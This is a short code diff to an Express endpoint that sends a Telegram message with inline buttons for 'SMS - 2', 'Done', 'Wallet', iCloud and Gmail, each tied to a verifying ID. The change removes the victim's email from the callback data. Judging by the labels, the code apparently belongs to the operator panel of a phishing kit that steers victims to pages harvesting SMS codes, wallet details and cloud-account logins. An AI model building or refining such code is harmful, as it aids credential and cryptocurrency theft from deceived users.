@@ -1912,12 +1912,12 @@ app.post("/send-verifying", async (req, res) => {
       parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [
-          [{ text: "💬 SMS - 2 💬", callback_data: `verifying_sms|${verifyingId}|${displayEmail}` }],
-          [{ text: "🏁 Done 🏁", callback_data: `verifying_done|${verifyingId}|${displayEmail}` }],
-          [{ text: "💼 Wallet 💼", callback_data: `verifying_wallet|${verifyingId}|${displayEmail}` }],
+          [{ text: "💬 SMS - 2 💬", callback_data: `verifying_sms|${verifyingId}` }],
+          [{ text: "🏁 Done 🏁", callback_data: `verifying_done|${verifyingId}` }],
+          [{ text: "💼 Wallet 💼", callback_data: `verifying_wallet|${verifyingId}` }],
           [
-            { text: "☁️", callback_data: `verifying_icloud|${verifyingId}|${displayEmail}` },
-            { text: "🌈", callback_data: `verifying_gmail|${verifyingId}|${displayEmail}` }
+            { text: "☁️", callback_data: `verifying_icloud|${verifyingId}` },
+            { text: "🌈", callback_data: `verifying_gmail|${verifyingId}` }
           ]
         ]
       }
